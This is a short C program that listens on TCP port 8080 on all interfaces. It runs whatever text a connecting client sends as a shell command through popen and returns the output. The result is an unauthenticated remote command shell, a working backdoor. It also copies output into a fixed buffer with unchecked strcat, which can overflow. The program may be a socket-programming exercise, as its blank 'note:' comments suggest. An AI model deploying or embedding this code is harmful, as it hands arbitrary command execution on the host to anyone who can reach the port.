#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 8080
#define BUFFER_SIZE 1024

void execute_command(char *command, char *response) {
    FILE *fp;
    fp = popen(command, "r");
    if (fp == NULL) {
        strcpy(response, "Failed to execute command.\n");
        return;
    }

    char temp[BUFFER_SIZE];
    while (fgets(temp, sizeof(temp), fp) != NULL) {
        strcat(response, temp);
    }
    pclose(fp);
}

int main() {
    int server_fd, client_socket;
    struct sockaddr_in address;
    int addrlen = sizeof(address);

    char buffer[BUFFER_SIZE] = {0};
    char response[BUFFER_SIZE * 4] = {0}; // Larger response buffer for command output

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {   //  note: 
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);
                                    //  note: 
    bind(server_fd, (struct sockaddr *)&address, sizeof(address));
    listen(server_fd, 10);

    printf("Server is listening on port %d...\n", PORT);

                                    //  note: 
    client_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        memset(response, 0, sizeof(response));

        int read_size = recv(client_socket, buffer, BUFFER_SIZE, 0);    // note:
        // int read_size = read(client_socket, buffer, BUFFER_SIZE);    // same as a file read
        if (read_size <= 0) {
            printf("Client disconnected.\n");
            break;
        }

        printf("Received command: %s\n", buffer);
        
        // Execute the command
        execute_command(buffer, response);
        
        // Send the response back to the client
        if(strlen(response) == 0) 
            sprintf(response, "\t%s", "no response");

        printf("%s\n", response);
        send(client_socket, response, strlen(response), 0);
    }

    close(client_socket);
    close(server_fd);
    return 0;
}